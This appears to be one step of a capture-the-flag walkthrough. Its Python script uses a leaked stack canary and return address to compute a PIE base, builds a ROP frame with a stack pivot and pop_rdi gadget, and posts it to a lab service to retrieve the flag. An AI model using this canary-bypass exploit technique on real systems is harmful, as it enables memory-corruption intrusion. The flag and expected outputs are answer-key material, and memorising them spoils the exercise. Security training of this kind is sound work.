After W28.1 (`record["status"]` and `relationship` saved).

The status record from W28.1 leaks the live stack canary and a return address.
Derive canary and PIE base, then build a non-issuer control frame using the
frame layout from `relationship["frame"]`:

```python
import json, struct, base64, ssl, urllib.request, pathlib

status = json.loads(pathlib.Path("/tmp/util-status.json").read_text())
relationship = json.loads(pathlib.Path("/tmp/util-relationship.json").read_text())
offsets = relationship["elf_offsets"]
layout = relationship["frame"]

session_id  = status["session_id"]
canary      = int(status["stack_canary"], 16)
pie_base    = int(status["return_address"], 16) - status["status_return_offset"]

# Non-issuer control frame: pad + canary + chain_ptr + stack_pivot + pop_rdi + controlled_target
result = bytearray(b"A" * layout["payload_bytes"] + b"\0" * layout["alignment_bytes"])
result += struct.pack("<Q", canary)
result += struct.pack("<Q", pie_base + layout["chain_offset"])
result += struct.pack("<Q", pie_base + offsets["stack_pivot"])
result += struct.pack("<Q", pie_base + offsets["pop_rdi"])
result += struct.pack("<Q", pie_base + offsets["controlled_target"])
frame_bytes = bytes(result)

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("receipts/process-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "Content-Type": "application/json"}

body = {"session_id": session_id, "length": len(frame_bytes),
        "frame_b64": base64.b64encode(frame_bytes).decode()}
d = json.loads(urllib.request.urlopen(
    urllib.request.Request(
        "https://process-view.arwc.test/api/release-plans/current/confirmation",
        data=json.dumps(body).encode(), headers=h, method="POST"),
    context=ctx).read())
print("record_id:", d["record"]["record_id"])     # FLOW-UTIL-CRR-R4
print("canary_preserved:", d["record"]["canary_preserved"])   # True
print("controlled_flow:", d["record"]["controlled_flow"])     # True
print("flag:", d["flag"])                          # FLAG{08c247e97a430854}
```

A tampered canary byte returns 409. The service verifies that the frame
preserves the canary at `layout["canary_offset"]` and reaches the controlled
target via the stack pivot at `layout["chain_offset"]`.

Flag: `FLAG{08c247e97a430854}` in the top-level `flag` field.
